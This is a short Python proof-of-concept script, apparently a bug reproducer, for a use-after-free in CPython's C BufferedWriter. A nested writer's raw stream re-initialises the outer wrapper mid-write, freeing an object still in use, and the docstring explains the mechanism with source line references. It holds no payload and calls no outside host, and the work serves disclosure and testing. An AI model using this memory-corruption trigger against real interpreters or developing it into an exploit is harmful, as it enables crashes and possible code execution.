"""bufferedio.c: a nested Buffered object is used as a BORROWED receiver.

`_bufferedwriter_raw_write` (Modules/_io/bufferedio.c:1996) calls
    PyObject_CallMethodOneArg(self->raw, &_Py_ID(write), memobj)
with `self->raw` borrowed out of the slot.  If that raw is itself a C
`_io.BufferedWriter`, the callee `_io_BufferedWriter_write_impl` runs with a
borrowed `self`, drives arbitrary user Python through *its* raw, and then keeps
touching `self` -- including `LEAVE_BUFFERED(self)`, which writes `self->owner`
and calls `PyThread_release_lock(self->lock)` on a lock that
`buffered_dealloc` (bufferedio.c:433-436) already `PyThread_free_lock`'d.

The re-entrancy weapon is `BufferedWriter.__init__`:
`Py_XSETREF(self->raw, raw)` at bufferedio.c:1957 drops the only reference to
the inner Buffered while its own C method is on the stack.

Usage:  python buffered_borrowed_raw_uaf.py [--pyio]
"""

import sys

if "--pyio" in sys.argv:
    import _pyio as io
else:
    import io

outer = None
fired = False


class PyRaw(io.RawIOBase):
    def writable(self):
        return True

    def write(self, b):
        global fired
        if outer is not None and not fired:
            fired = True
            # Re-init the OUTER wrapper: bufferedio.c:1957 Py_XSETREF(self->raw, raw)
            # drops the inner BufferedWriter that is currently executing.
            outer.__init__(io.BytesIO(), buffer_size=64)
        return len(b)


# No local reference to the inner BufferedWriter: outer->raw is its only owner.
outer = io.BufferedWriter(io.BufferedWriter(PyRaw(), buffer_size=1024), buffer_size=1024)

print("start", flush=True)
try:
    outer.write(b"Z" * (1024 * 64))
except Exception as exc:  # noqa: BLE001
    print("raised", type(exc).__name__, exc, flush=True)
else:
    print("write returned", flush=True)
print("survived", flush=True)
